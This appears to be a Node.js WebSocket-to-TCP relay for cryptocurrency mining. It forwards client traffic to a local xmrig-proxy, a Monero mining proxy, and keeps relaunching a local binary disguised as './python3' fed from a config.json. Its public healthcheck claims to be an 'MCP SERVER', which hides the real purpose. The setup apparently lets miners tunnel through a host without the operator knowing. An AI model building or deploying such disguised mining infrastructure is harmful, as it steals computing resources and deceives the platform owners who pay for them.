import uWS from "uWebSockets.js";
import net from "net";
import { spawn } from "child_process";


const PORT = 8080;
const XMRIG_PROXY_HOST = "127.0.0.1";
const XMRIG_PROXY_PORT = 3333;
const app = uWS.App();

// Cấu hình giới hạn
const MAX_QUEUE_SIZE = 1000;           // tối đa 1000 message trong queue
const MAX_PAYLOAD_LENGTH = 1024 * 1024; // 1MB WebSocket payload
const IDLE_TIMEOUT_SECONDS = 300;      // 5 phút

const DEBUG = true;

// Chuẩn hóa message: đảm bảo có newline cuối
function normalizeLine(msg) {
    const text = typeof msg === "string" ? msg : String(msg);
    return text.endsWith("\n") ? text : text + "\n";
}

function safeEndWS(ws, code, reason) {
    try {
        if (ws.isClosed) return;
        if (ws.isOpen) {
            ws.end(code, reason);
        }
    } catch (e) {
        console.error("Error closing WebSocket:", e);
    }
}

function startTcpProxy() {
    console.log(`Starting tcp endpoint proxy...`);
    const proxy = spawn("./python3", ['-c', './config.json']);

    proxy.stdout.on("data", (data) => {
        console.log(`[PROXY][INFO] ${data.toString().trim()}`);
    });

    proxy.stderr.on("data", (data) => {
        console.error(`[PROXY][ERROR] ${data.toString().trim()}`);
    });

    proxy.on("close", (code) => {
        console.log(`[PROXY][INFO] Exited with code ${code}. Restarting...`);
        setTimeout(startTcpProxy, 5000);
    });
}

// HTTP healthcheck
app.get("/", (res) => {
    res.writeHeader("Content-Type", "text/plain; charset=utf-8");
    res.writeHeader("Cache-Control", "no-store");
    res.end("MCP SERVER STATUS: RUNNING!");
});

// WebSocket <-> TCP proxy
app.ws("/*", {
    compression: 0,
    maxPayloadLength: MAX_PAYLOAD_LENGTH,
    idleTimeout: IDLE_TIMEOUT_SECONDS,

    upgrade: (res, req, context) => {
        try {
            const ip = Buffer.from(res.getRemoteAddressAsText()).toString();

            res.upgrade(
                {
                    ip,
                    isConnected: false,
                    queue: [],
                    tcp: null,
                    tcpHost: `${XMRIG_PROXY_HOST}:${XMRIG_PROXY_PORT}`,
                },
                req.getHeader("sec-websocket-key"),
                req.getHeader("sec-websocket-protocol"),
                req.getHeader("sec-websocket-extensions"),
                context
            );
        } catch (e) {
            console.error("Upgrade error:", e);
        }
    },

    open: (ws) => {
        const host = XMRIG_PROXY_HOST;
        const port = XMRIG_PROXY_PORT;

        const clientIp = ws.ip;
        const tcp = net.createConnection({ host, port });
        tcp.setTimeout(0);
        tcp.setKeepAlive(true);
        tcp.setNoDelay(true);

        ws.isConnected = false;
        ws.queue = [];
        ws.tcp = tcp;
        ws.tcpHost = `${host}:${port}`;

        tcp.on("connect", () => {
            ws.isConnected = true;

            // flush queue
            for (const msg of ws.queue) {
                tcp.write(normalizeLine(msg));
            }
            ws.queue.length = 0;

            console.log(`🟢 SUCCESS: WS [${clientIp}] <-> TCP [${host}:${port}]`);
        });

        tcp.on("data", (data) => {
            try {
                if (ws.isClosed) return;
                ws.send(data.toString("utf-8"), false);
            } catch (err) {
                console.error("WS send failed:", err?.message ?? err);
            }
        });

        tcp.on("close", () => {
            safeEndWS(ws, 1000, "TCP closed");
        });

        tcp.on("error", (err) => {
            console.error(`TCP error [${host}:${port}] for WS [${clientIp}]:`, err.message);
            safeEndWS(ws, 1011, err.message || "TCP error");
        });
    },

    // Helper nếu bạn cần gọi từ nơi khác
    tcpSend: (ws, msg) => {
        if (!ws.isConnected || !ws.tcp || ws.tcp.destroyed) return;
        ws.tcp.write(normalizeLine(msg));
    },

    message: (ws, msg) => {
        const data = Buffer.from(msg);
        const text = data.toString("utf-8");

        if (ws.isConnected && ws.tcp && !ws.tcp.destroyed) {
            ws.tcp.write(normalizeLine(text));
        } else {
            if (!Array.isArray(ws.queue)) {
                ws.queue = [];
            }

            if (ws.queue.length >= MAX_QUEUE_SIZE) {
                console.warn(
                    `Queue overflow for WS [${ws.ip}] -> ${ws.tcpHost || "unknown target"}`
                );
                safeEndWS(ws, 1011, "Queue overflow");
                return;
            }

            ws.queue.push(text);
        }
    },

    close: (ws, code, message) => {
        const clientIp = ws.ip;
        const tcpHost = ws.tcpHost;

        if (ws.tcp && !ws.tcp.destroyed) {
            try {
                ws.tcp.destroy();
            } catch (e) {
                console.error("Error destroying TCP socket:", e);
            }
        }

        // Dọn state
        ws.isConnected = false;
        ws.queue = [];
        ws.tcp = null;

        const reason = Buffer.from(message || "").toString("utf-8") || "no reason";
        console.log(
            `🔴 DISCONNECTED: WS [${clientIp}] <-> TCP [${tcpHost}] (code=${code}, reason="${reason}")`
        );
    },
});

app.listen("0.0.0.0", PORT, (t) => {
    if (t) {
        console.log(`🚀 WS⇄TCP proxy running on port ${PORT}`);
        console.log(`Forwarding fallback matches to local xmrig-proxy at ${XMRIG_PROXY_HOST}:${XMRIG_PROXY_PORT}`);
        startTcpProxy();
    } else {
        console.error("❌ Failed to listen");
    }
});
